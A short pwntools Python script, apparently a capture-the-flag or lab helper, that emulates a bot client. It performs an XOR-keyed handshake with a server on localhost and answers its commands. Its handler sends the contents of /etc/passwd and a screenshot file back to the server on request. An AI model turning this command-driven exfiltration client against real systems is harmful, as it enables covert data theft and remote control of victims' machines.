from pwn import *
import struct
import socket

r = remote("localhost",9999)
masterkey = 0xdeadbeaf
sessionkey = randint(0,0xffffff)
checksum = randint(0,0xffffff)

#handshake
r.send(struct.pack("!III", checksum, checksum^masterkey, sessionkey^masterkey))

def writecmd(conn, key, data):
    conn.p32(len(data) ^ key)
    conn.write(xor(data,struct.pack("I",key)))

def readcmd(conn, key):
    l = conn.u32() ^ key
    cmd = xor(conn.readn(l),struct.pack("I",key))
    return cmd

while True:
    cmd = readcmd(r, sessionkey)
    if cmd == 'hello':
        writecmd(r, sessionkey, cmd.ljust(16,' ') + socket.gethostname())
    elif cmd == 'version':
        writecmd(r, sessionkey, cmd.ljust(16,' ') + '0.1.1')
    elif cmd == 'passwd':
        writecmd(r, sessionkey, cmd.ljust(16,' ') + open('/etc/passwd').read())
    elif cmd == 'screen':
        writecmd(r, sessionkey, cmd.ljust(16,' ') + open('Screenshot.gif').read())
    elif cmd == 'ping':
        writecmd(r, sessionkey, cmd.ljust(16,' ') + 'pong')

r.close()
